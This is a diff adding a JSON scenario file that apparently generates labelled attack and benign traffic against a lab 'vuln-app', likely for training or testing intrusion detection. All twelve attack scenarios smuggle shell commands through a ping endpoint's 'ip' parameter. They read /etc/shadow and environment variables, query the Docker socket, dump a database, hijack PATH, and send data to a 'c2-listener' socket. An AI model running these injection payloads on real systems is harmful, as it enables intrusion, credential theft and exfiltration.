@@ -1,0 +1,169 @@
+{
+  "scenario_set": "default",
+  "scenarios": [
+    {
+      "id": "shadow_read",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;cat /etc/passwd;cat /etc/shadow;id;uname -a\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "c2_exfil",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target", "c2"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import os,socket,subprocess; s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(subprocess.check_output('id;uname -a;hostname', shell=True)); s.close()\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "docker_version",
+      "kind": "attack",
+      "target_service": "vuln-app-dsock",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target_dsock"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /version HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(4096).decode(\\\\\\'utf-8\\\\\\', \\\\\\'ignore\\\\\\'))\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "docker_list",
+      "kind": "attack",
+      "target_service": "vuln-app-dsock",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target_dsock"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app-dsock:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import socket; s=socket.socket(socket.AF_UNIX); s.connect('/var/run/docker.sock'); s.sendall(b'GET /containers/json HTTP/1.0\\\\r\\\\nHost: docker\\\\r\\\\n\\\\r\\\\n'); print(s.recv(4096).decode(\\\\\\'utf-8\\\\\\', \\\\\\'ignore\\\\\\'))\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "db_dump_local",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"seed\",\"item\":\"sku-001\",\"quantity\":1}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3; conn=sqlite3.connect('/app/data/app.db'); data={'users': conn.execute('select username,role from users order by username').fetchall(), 'orders': conn.execute('select customer,item,quantity from orders order by id desc limit 5').fetchall()}; print(json.dumps(data, default=list))\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "env_probe",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;cat /proc/self/environ;cat /etc/hostname;pwd;ls -la /app\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "path_hijack",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf '#!/bin/sh\\necho hijacked > /tmp/hijack.txt\\necho PWNED\\n' > /tmp/ping; chmod +x /tmp/ping; PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ping -c 1 127.0.0.1\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "drop_and_exec",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;printf '#!/bin/sh\\nid > /tmp/agent.out\\nuname -a >> /tmp/agent.out\\n' > /tmp/agent.sh; chmod +x /tmp/agent.sh; /tmp/agent.sh\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "recon_burst",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;ls -la /;ls -la /app;cat /etc/passwd;ps aux;find /app -maxdepth 2 -type f | head -n 20\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "mmap_mutation_probe",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import mmap\\nf=open(\\\\\\'/etc/ld.so.cache\\\\\\',\\\\\\'rb\\\\\\')\\nm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)\\nok=True\\ntry:\\n m[0]=0\\nexcept Exception:\\n ok=False\\nm.close(); f.close(); print(\\\\\\'dirtycow_sim\\\\\\',ok)')\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "cpu_miner",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target"],
+      "negative_roles": [],
+      "duration_seconds": 18,
+      "command": "set -eu; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"exec('import time\\nt=time.time()+12\\nx=0\\nwhile time.time()<t:\\n x=(x*1664525+1013904223) & 0xFFFFFFFF\\nprint(\\\\\\'miner_done\\\\\\')')\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "db_exfil_to_c2",
+      "kind": "attack",
+      "target_service": "vuln-app",
+      "driver_role": "attacker",
+      "positive_roles": ["attacker", "target", "c2"],
+      "negative_roles": [],
+      "duration_seconds": 10,
+      "command": "set -eu; curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"seed\",\"item\":\"sku-002\",\"quantity\":2}' 'http://vuln-app:5000/api/order' >/dev/null; curl -sG 'http://vuln-app:5000/ping' --data-urlencode \"ip=127.0.0.1;python -c \\\"import json,sqlite3,socket; conn=sqlite3.connect('/app/data/app.db'); rows=conn.execute('select customer,item,quantity from orders order by id desc limit 5').fetchall(); payload=json.dumps({'orders':[tuple(r) for r in rows]}); s=socket.socket(); s.connect(('c2-listener',4444)); s.sendall(payload.encode()); s.close()\\\"\" >/dev/null; sleep 2"
+    },
+    {
+      "id": "browse_order_loop",
+      "kind": "benign",
+      "target_service": "vuln-app",
+      "driver_role": "benign",
+      "positive_roles": [],
+      "negative_roles": ["benign"],
+      "description": "Short benign smoke benchmark only; not part of the formal benign training corpus",
+      "duration_seconds": 12,
+      "command": "set -eu; for i in $(seq 1 25); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{\"username\":\"alice\",\"password\":\"password\"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*\"token\":\"\\([^\"]*\\)\".*/\\1/p'); curl -s 'http://vuln-app:5000/health' >/dev/null; curl -s 'http://vuln-app:5000/api/items' >/dev/null; curl -s 'http://vuln-app:5000/api/search?q=sku' >/dev/null; curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"alice\",\"item\":\"sku-001\",\"quantity\":1}' 'http://vuln-app:5000/api/order' >/dev/null; if [ -n \"$TOKEN\" ]; then curl -s -H \"Authorization: Bearer $TOKEN\" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H \"Authorization: Bearer $TOKEN\" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.2; done; sleep 2"
+    },
+    {
+      "id": "auth_session_churn",
+      "kind": "benign",
+      "target_service": "vuln-app",
+      "driver_role": "benign",
+      "positive_roles": [],
+      "negative_roles": ["benign"],
+      "description": "Short benign smoke benchmark only; not part of the formal benign training corpus",
+      "duration_seconds": 10,
+      "command": "set -eu; for i in $(seq 1 30); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{\"username\":\"alice\",\"password\":\"password\"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*\"token\":\"\\([^\"]*\\)\".*/\\1/p'); if [ -n \"$TOKEN\" ]; then curl -s -H \"Authorization: Bearer $TOKEN\" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H \"Authorization: Bearer $TOKEN\" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.15; done; sleep 2"
+    },
+    {
+      "id": "search_heavy",
+      "kind": "benign",
+      "target_service": "vuln-app",
+      "driver_role": "benign",
+      "positive_roles": [],
+      "negative_roles": ["benign"],
+      "description": "Short benign smoke benchmark only; not part of the formal benign training corpus",
+      "duration_seconds": 10,
+      "command": "set -eu; for i in $(seq 1 12); do ORDER_ID=$(curl -s -H 'Content-Type: application/json' -d '{\"customer\":\"alice\",\"item\":\"sku-003\",\"quantity\":1}' 'http://vuln-app:5000/api/order' | sed -n 's/.*\"order_id\":\\([0-9][0-9]*\\).*/\\1/p'); curl -s \"http://vuln-app:5000/api/search?q=alice\" >/dev/null; curl -s \"http://vuln-app:5000/api/search?q=sku-003\" >/dev/null; if [ -n \"$ORDER_ID\" ]; then curl -s \"http://vuln-app:5000/api/order/$ORDER_ID\" >/dev/null; fi; sleep 0.25; done; sleep 2"
+    },
+    {
+      "id": "admin_readonly",
+      "kind": "benign",
+      "target_service": "vuln-app",
+      "driver_role": "benign",
+      "positive_roles": [],
+      "negative_roles": ["benign"],
+      "description": "Short benign smoke benchmark only; not part of the formal benign training corpus",
+      "duration_seconds": 10,
+      "command": "set -eu; for i in $(seq 1 20); do TOKEN=$(curl -s -H 'Content-Type: application/json' -d '{\"username\":\"bob\",\"password\":\"password\"}' 'http://vuln-app:5000/api/login' | sed -n 's/.*\"token\":\"\\([^\"]*\\)\".*/\\1/p'); curl -s 'http://vuln-app:5000/api/items' >/dev/null; curl -s 'http://vuln-app:5000/api/search?q=alice' >/dev/null; if [ -n \"$TOKEN\" ]; then curl -s -H \"Authorization: Bearer $TOKEN\" 'http://vuln-app:5000/api/me' >/dev/null; curl -s -X POST -H \"Authorization: Bearer $TOKEN\" 'http://vuln-app:5000/api/logout' >/dev/null; fi; sleep 0.2; done; sleep 2"
+    }
+  ]
+}
